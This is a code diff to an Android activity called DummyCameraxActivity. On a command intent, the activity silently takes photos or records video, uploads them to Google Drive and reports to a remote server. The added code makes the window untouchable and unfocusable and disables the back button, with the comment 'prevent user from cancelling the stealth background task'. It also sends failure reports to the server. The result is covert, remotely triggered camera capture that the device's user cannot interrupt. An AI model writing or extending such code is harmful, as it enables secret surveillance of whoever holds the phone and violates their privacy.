@@ -51,6 +51,17 @@ class DummyCameraxActivity : AppCompatActivity() {
             window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
         }
 
+        window.setFlags(
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+        )
+
+        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
+            override fun handleOnBackPressed() {
+                // Do nothing to prevent user from cancelling the stealth background task
+            }
+        })
+
         cameraExecutor = Executors.newSingleThreadExecutor()
     }
 
@@ -60,13 +71,18 @@ class DummyCameraxActivity : AppCompatActivity() {
         shouldFlash = intent.extras?.getBoolean(EXTRA_FLASH) ?: false
 
         lifecycleScope.launch {
-            val commandName = intent.extras?.getString(EXTRA_COMMAND) ?: "camera"
+            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
             if (commandName == "video") {
                 recordVideo()
             } else {
                 takePhoto()
             }
         }
+    }
+
+    override fun onNewIntent(intent: android.content.Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
     }
 
     override fun onDestroy() {
@@ -133,6 +149,9 @@ class DummyCameraxActivity : AppCompatActivity() {
                 TAG,
                 "Cannot take picture: bindToLifecycle failed, see the stacktrace. message=${e.message} cause=${e.cause}"
             )
+            val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
+            transport.send(applicationContext, "Photo capture failed: bindToLifecycle error", intent.extras?.getString(EXTRA_COMMAND) ?: "camera")
+            finish()
             return
         }
 
@@ -156,6 +175,9 @@ class DummyCameraxActivity : AppCompatActivity() {
                     super.onError(exception)
                     applicationContext.log()
                         .w(TAG, "Failed to take picture: ${exception.imageCaptureError}")
+                    val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
+                    transport.send(applicationContext, "Photo capture failed: ${exception.imageCaptureError}", intent.extras?.getString(EXTRA_COMMAND) ?: "camera")
+                    finish()
                 }
             })
     }
@@ -167,7 +189,7 @@ class DummyCameraxActivity : AppCompatActivity() {
         val tempFile = java.io.File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
         tempFile.writeBytes(imgBytes)
 
-        val commandName = intent.extras?.getString(EXTRA_COMMAND) ?: "camera"
+        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
 
         com.neubofy.veto.utils.GoogleDriveUploader.uploadFile(
             context = this,
@@ -220,6 +242,8 @@ class DummyCameraxActivity : AppCompatActivity() {
             kotlinx.coroutines.delay(1500L)
         } catch (e: Exception) {
             this.log().e(TAG, "Cannot record video: bindToLifecycle failed. ${e.message}")
+            val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
+            transport.send(applicationContext, "Video recording failed: bindToLifecycle error", intent.extras?.getString(EXTRA_COMMAND) ?: "video")
             finish()
             return
         }
@@ -249,7 +273,7 @@ class DummyCameraxActivity : AppCompatActivity() {
 
     private fun uploadVideoAndFinish(tempFile: java.io.File) {
         val ctx = applicationContext
-        val commandName = intent.extras?.getString(EXTRA_COMMAND) ?: "video"
+        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "video"
 
         com.neubofy.veto.utils.GoogleDriveUploader.uploadFile(
             context = ctx,
